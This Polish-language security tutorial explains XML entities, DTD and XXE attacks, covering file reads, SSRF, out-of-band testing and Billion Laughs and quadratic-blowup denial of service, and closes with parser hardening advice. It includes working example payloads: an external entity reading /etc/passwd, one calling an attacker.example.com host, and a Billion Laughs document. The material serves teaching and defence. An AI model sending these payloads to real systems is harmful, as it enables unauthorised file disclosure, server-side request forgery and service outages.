---
id: xml-security-xxe-entities-and-parser-attacks
title: "XML Security: XXE, encje i pułapki parserów XML"
team: red-blue
domain: web-security
section: vulnerabilities
type: knowledge
angle: parser-security-and-data-processing-mindset
sourceTrack: baw
tags:
  [
    "xml",
    "xxe",
    "external-entity",
    "entities",
    "dtd",
    "ssrf",
    "file-read",
    "dos",
    "billion-laughs",
    "quadratic-blowup",
    "web-security",
  ]
difficulty: medium
shortDescription: "Wprowadzenie do bezpieczeństwa XML: czym są encje, DTD i zewnętrzne encje XML, dlaczego parser XML może stać się źródłem podatności oraz jak z takich mechanizmów powstają ataki typu XXE, SSRF, odczyt plików i DoS."
updatedAt: "2026-05-17"
---

# XML Security: XXE, encje i pułapki parserów XML

## Dlaczego ten temat jest ważny

XML wygląda trochę jak stara technologia, którą łatwo zignorować.

W praktyce dalej pojawia się w wielu miejscach: integracjach między systemami, SOAP, XML-RPC, plikach konfiguracyjnych, dokumentach `.docx`, kanałach RSS, metadanych obrazów, komunikacji między usługami i starszych API.

Problem polega na tym, że XML nie jest tylko „formatem danych”.

XML może zawierać dodatkową logikę przetwarzania. Może definiować encje, ładować zewnętrzne zasoby, odwoływać się do plików, rozwijać wartości i korzystać z DTD. Jeżeli aplikacja bezpiecznie traktuje JSON-a jako zwykłe dane, to XML-a nie zawsze można traktować tak samo.

Tutaj zaczyna się cała klasa podatności.

Atakujący nie próbuje wtedy od razu „złamać aplikacji” klasycznym SQL Injection czy XSS. Próbuje sprawdzić, czy parser XML wykonuje za dużo pracy i czy ufa strukturze dokumentu dostarczonego przez użytkownika.

## XML jako dane, które parser musi zinterpretować

Najprostszy XML może wyglądać niewinnie:

```xml
<data>
  <transaction>
    <id>12345678</id>
    <amount>456.00</amount>
    <currency>PLN</currency>
    <comment>Zakup książki</comment>
  </transaction>
</data>
```

Dla aplikacji to po prostu dane o transakcji.

Ale parser XML nie widzi tylko tekstu. On musi zrozumieć strukturę dokumentu, tagi, wartości, atrybuty, znaki specjalne i dodatkowe deklaracje.

Przykład: znak `<` ma w XML-u specjalne znaczenie, bo oznacza początek tagu. Jeżeli chcemy użyć go jako zwykłego tekstu, musimy zapisać go jako encję:

```xml
<comment>I &lt;3 Sekurak!</comment>
```

Po przetworzeniu parser zamieni `&lt;` na `<`.

I to jest pierwszy ważny mental model:

> Parser XML może zamieniać jedną rzecz na drugą podczas przetwarzania dokumentu.

Na tym samym mechanizmie opierają się późniejsze podatności.

## Czym są encje XML

Encje w XML-u działają trochę jak mechanizm „znajdź i zamień”.

Możemy mieć encje wbudowane, takie jak:

```xml
&lt;    <!-- < -->
&gt;    <!-- > -->
&amp;   <!-- & -->
&quot;  <!-- " -->
&apos;  <!-- ' -->
```

Ale XML pozwala też definiować własne encje za pomocą DTD, czyli Document Type Definition.

Przykład:

```xml
<!DOCTYPE data [
  <!ENTITY title "Bezpieczeństwo aplikacji webowych">
]>
<data>
  <transaction>
    <comment>Za książkę: &title;</comment>
  </transaction>
</data>
```

Parser, widząc `&title;`, podstawia wartość encji:

```text
Bezpieczeństwo aplikacji webowych
```

Samo w sobie nie musi to być podatne.

Problem zaczyna się wtedy, gdy encja może wskazywać nie tylko na wartość zdefiniowaną w dokumencie, ale także na zewnętrzny zasób.

## Encje zewnętrzne

XML pozwala zdefiniować encję, która pobiera zawartość z zewnętrznego źródła.

Przykład:

```xml
<!DOCTYPE data [
  <!ENTITY title SYSTEM "plik.xml">
]>
```

W takim przypadku parser może spróbować załadować zawartość `plik.xml` i podstawić ją w miejscu użycia encji.

To jest bardzo ważny moment.

Jeżeli aplikacja pozwala użytkownikowi dostarczyć XML-a, a parser pozwala na ładowanie zewnętrznych encji, to użytkownik może próbować wskazać nie tylko zwykły plik XML, ale także plik lokalny na serwerze albo adres URL.

Wtedy parser zaczyna wykonywać akcje, których aplikacja biznesowo wcale nie potrzebowała.

## DTD jako miejsce, w którym zaczyna się ryzyko

DTD znajduje się zwykle na początku dokumentu XML i zaczyna się od:

```xml
<!DOCTYPE ...>
```

To tam można definiować encje.

Przykład:

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "/etc/passwd">
]>
```

Dla pentestera pojawienie się `<!DOCTYPE` w danych XML jest sygnałem, że trzeba sprawdzić, czy parser obsługuje DTD i encje zewnętrzne.

Dla developera i osoby od bezpieczeństwa jest to sygnał odwrotny:

> Czy ta aplikacja naprawdę potrzebuje DTD?
> Jeżeli nie, to najlepiej całkowicie wyłączyć jego przetwarzanie.

## XXE, czyli XML External Entity

XXE, czyli XML External Entity, to podatność polegająca na tym, że aplikacja przetwarza zewnętrzne encje XML w sposób niebezpieczny.

Najczęstszy efekt to:

- odczyt lokalnych plików z serwera,
- wykonanie zapytań HTTP z perspektywy serwera,
- atak SSRF,
- ujawnienie danych konfiguracyjnych,
- czasem DoS przez kosztowne przetwarzanie dokumentu.

Przykład podatnego scenariusza:

Aplikacja przyjmuje XML:

```xml
<data>
  <transaction>
    <id>12345678</id>
    <amount>456.00</amount>
    <currency>PLN</currency>
    <comment>Zakup</comment>
  </transaction>
</data>
```

A potem zwraca w odpowiedzi wartość `id`:

```xml
<response>
  Transaction id=12345678 completed successfully!
</response>
```

Jeżeli parser obsługuje zewnętrzne encje, atakujący może spróbować czegoś takiego:

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "/etc/passwd">
]>
<data>
  <transaction>
    <id>12345678&xxe;</id>
    <amount>456.00</amount>
    <currency>PLN</currency>
    <comment>Zakup</comment>
  </transaction>
</data>
```

Jeżeli aplikacja jest podatna, parser wstawi zawartość pliku `/etc/passwd` w miejsce `&xxe;`, a odpowiedź może ujawnić fragment pliku.

To nie jest magia.

To parser zrobił dokładnie to, na co mu pozwolono: załadował zewnętrzną encję i podstawił jej wartość do dokumentu.

## XXE jako SSRF

XXE nie musi służyć tylko do odczytu plików.

Jeżeli parser pozwala ładować zasoby przez HTTP, można sprawdzić, czy serwer wykona zapytanie do wskazanego adresu:

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://attacker.example.com/test">
]>
<data>
  <transaction>
    <id>&xxe;</id>
  </transaction>
</data>
```

W labie zamiast domeny atakującego używa się zwykle kontrolowanego endpointu, Burp Collaboratora albo prostego serwera HTTP.

Jeżeli request pojawi się po stronie kontrolowanego serwera, oznacza to, że aplikacja wykonała połączenie wychodzące.

To otwiera drogę do SSRF, czyli Server-Side Request Forgery.

W praktyce można wtedy testować, czy serwer może odpytywać wewnętrzne adresy, usługi administracyjne, metadane chmurowe albo panele dostępne tylko z sieci wewnętrznej.

## Gdy aplikacja nie zwraca wartości w odpowiedzi

Nie każda aplikacja zwróci nam przetworzoną wartość XML-a w odpowiedzi.

Czasami odpowiedź wygląda tylko tak:

```xml
<response>
  Success!
</response>
```

W takim przypadku klasyczne XXE z odczytem pliku w odpowiedzi może nie zadziałać, bo nie ma miejsca, w którym wynik zostanie odbity.

Nie oznacza to jednak, że temat jest zamknięty.

Wtedy testuje się tak zwane out-of-band XXE, czyli wariant, w którym parser ma wykonać połączenie do zewnętrznego serwera. Sam fakt wykonania połączenia może potwierdzić, że parser próbuje rozwiązywać zewnętrzne encje.

To ważna różnica:

- jeżeli wynik wraca w odpowiedzi, mówimy o łatwiejszym, widocznym XXE,
- jeżeli wynik nie wraca w odpowiedzi, trzeba testować zachowanie parsera kanałem zewnętrznym.

## Encje parametryczne

XML ma też encje parametryczne, które są używane wewnątrz DTD.

Rozpoznaje się je po znaku `%`.

Przykład:

```xml
<!DOCTYPE data [
  <!ENTITY % test "<!ENTITY value 'hello'>">
  %test;
]>
```

To wygląda dziwnie, ale idea jest prosta: encja parametryczna może dynamicznie budować fragment DTD.

W praktyce encje parametryczne są ważne przy bardziej zaawansowanych wariantach XXE, szczególnie wtedy, gdy:

- zwykłe encje nie mogą zostać użyte w danym miejscu,
- wartość znajduje się w atrybucie,
- aplikacja nie przepisuje wartości do odpowiedzi,
- trzeba załadować zewnętrzne DTD z kontrolowanego serwera.

Nie trzeba na początku umieć pisać takich payloadów z pamięci.

Trzeba rozumieć ich sens:

> Encje parametryczne pozwalają wpływać na definicję DTD, a nie tylko na tekst w tagach XML.

## Billion Laughs, czyli DoS przez rozwijanie encji

XXE to nie jedyny problem.

Skoro jedna encja może zawierać inne encje, można zbudować dokument, który jest mały na wejściu, ale ogromny po przetworzeniu przez parser.

Klasyczny przykład to Billion Laughs:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

Każdy poziom rozwija poprzedni wielokrotnie.

Plik wejściowy może być krótki, ale parser musi utworzyć bardzo dużą wartość w pamięci. Jeżeli poziomów jest więcej, aplikacja może zużyć ogromną ilość RAM-u i przestać odpowiadać.

To jest atak Denial of Service wynikający z mechanizmu przetwarzania XML-a.

Nie atakujemy tutaj logiki biznesowej. Atakujemy koszt parsowania danych.

## Quadratic Blowup

Niektóre parsery mają zabezpieczenia przed głębokim zagnieżdżaniem encji.

To nie zawsze wystarcza.

Inny wariant polega na zdefiniowaniu jednej dużej encji i wielokrotnym użyciu jej w dokumencie.

Przykładowy model:

```xml
<!DOCTYPE data [
  <!ENTITY x "AAAAAAAAAA...bardzo długa wartość...">
]>
<data>
  &x;&x;&x;&x;&x;&x;&x;&x;
</data>
```

Nie ma tutaj wielu poziomów zagnieżdżenia.

Jest za to duża wartość, która zostaje powtórzona wiele razy.

Efekt może być podobny: mały dokument wejściowy powoduje bardzo kosztowne przetwarzanie po stronie serwera.

To pokazuje ważną rzecz:

> Limit samej głębokości encji nie wystarcza. Trzeba też kontrolować rozmiar wejścia, rozmiar wyniku i czas przetwarzania.

## Na co patrzeć podczas testów bezpieczeństwa

Podczas testów aplikacji webowej XML powinien zapalić lampkę ostrzegawczą zawsze wtedy, gdy widzimy:

```http
Content-Type: application/xml
```

albo:

```http
Content-Type: text/xml
```

albo gdy request body wygląda jak XML:

```xml
<user>
  <id>1</id>
</user>
```

Wtedy warto odpowiedzieć sobie na kilka pytań:

Czy aplikacja przyjmuje XML od użytkownika?

Czy parser akceptuje `<!DOCTYPE>`?

Czy parser przetwarza encje?

Czy wartość z XML-a jest odbijana w odpowiedzi?

Czy aplikacja wykonuje połączenia wychodzące podczas parsowania?

Czy można wywołać błąd parsera i zobaczyć szczegóły w odpowiedzi?

Czy XML jest używany tylko w API, czy także w uploadzie plików, dokumentach, importach, integracjach i panelach administracyjnych?

To jest właśnie różnica między patrzeniem na endpoint a patrzeniem na cały przepływ danych.

## Przykładowy bezpieczny kierunek myślenia

Jeżeli aplikacja nie potrzebuje DTD, najbezpieczniej jest je wyłączyć.

Jeżeli aplikacja nie potrzebuje zewnętrznych encji, trzeba wyłączyć ich rozwiązywanie.

Jeżeli aplikacja musi przetwarzać XML, parser powinien mieć limity:

- maksymalny rozmiar pliku wejściowego,
- maksymalny czas parsowania,
- maksymalną liczbę rozwinięć encji,
- maksymalny rozmiar wyniku po rozwinięciu,
- brak dostępu do lokalnych plików,
- brak niekontrolowanych połączeń sieciowych.

Ważne jest też, żeby nie ufać domyślnej konfiguracji biblioteki.

Różne języki i różne parsery mają różne zachowania. To, co jest bezpieczne w jednej bibliotece, może być ryzykowne w innej.

## Jak to rozumieć jako pentester

XXE nie zaczyna się od payloadu.

XXE zaczyna się od pytania:

> Czy aplikacja daje mi wpływ na dokument XML, który później zostanie przetworzony przez parser po stronie serwera?

Jeżeli tak, następne pytanie brzmi:

> Czy parser robi coś więcej niż tylko odczyt tagów i wartości?

Dopiero potem testujemy:

- czy działa DTD,
- czy działają encje,
- czy działa encja zewnętrzna,
- czy wynik jest odbijany w odpowiedzi,
- czy serwer wykonuje połączenie na zewnątrz,
- czy da się odczytać plik,
- czy da się wykonać SSRF,
- czy da się przeciążyć parser.

Payload jest tylko narzędziem do sprawdzenia hipotezy.

Najważniejsze jest zrozumienie, gdzie parser dostaje dane i co wolno mu zrobić.

## Jak to rozumieć jako osoba broniąca aplikacji

Z perspektywy blue teamu i bezpiecznego developmentu XML jest ryzykowny wtedy, gdy parser ma za dużo uprawnień.

Bezpieczny parser powinien działać jak ostrożny czytnik danych, a nie jak mechanizm, który może:

- czytać lokalne pliki,
- wykonywać połączenia HTTP,
- rozwijać nieograniczone encje,
- pobierać zewnętrzne DTD,
- generować ogromne obiekty w pamięci.

Jeżeli aplikacja przyjmuje XML, warto sprawdzić konfigurację parsera w kodzie i upewnić się, że nie działa w trybie zbyt liberalnym.

Samo filtrowanie znaków w request body nie jest dobrą obroną.

Lepszą obroną jest wyłączenie niepotrzebnych funkcji parsera.

## Minimalny mental model

XML może zawierać DTD.

DTD może definiować encje.

Encje mogą być rozwijane przez parser.

Encje zewnętrzne mogą wskazywać na pliki lub adresy URL.

Jeżeli parser na to pozwala, aplikacja może nieświadomie ujawnić pliki, wykonać zapytania z serwera albo zużyć zbyt dużo zasobów.

Dlatego XXE i ataki na encje nie są „dziwnymi payloadami”.

To wykorzystanie funkcji XML-a, które w aplikacji webowej zwykle nie powinny być dostępne dla danych od użytkownika.

## Najważniejsza myśl

W XML-u podatność często nie wynika z tego, że aplikacja ma skomplikowaną logikę.

Wynika z tego, że parser dostał dokument od użytkownika i miał włączone funkcje, których ta aplikacja nigdy realnie nie potrzebowała.
